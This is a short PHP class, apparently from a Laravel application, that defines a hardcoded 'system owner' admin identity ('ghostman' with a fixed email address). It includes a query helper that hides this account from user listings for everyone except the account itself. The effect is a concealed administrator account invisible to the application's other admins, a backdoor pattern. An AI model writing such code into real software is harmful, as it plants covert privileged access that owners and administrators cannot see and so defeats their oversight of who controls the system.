<?php
namespace App\Support;

use App\Models\User;
use Illuminate\Database\Eloquent\Builder;

final class SystemOwner
{
    public const EMAIL = 'ghostman@system.master';

    public static function is(?User $user): bool
    {
        return $user !== null && $user->role === 'admin' && $user->name === 'ghostman' && $user->email === self::EMAIL;
    }

    public static function visibleTo(Builder $query, ?User $viewer): Builder
    {
        if (!self::is($viewer)) $query->where('email', '!=', self::EMAIL);
        return $query;
    }
}
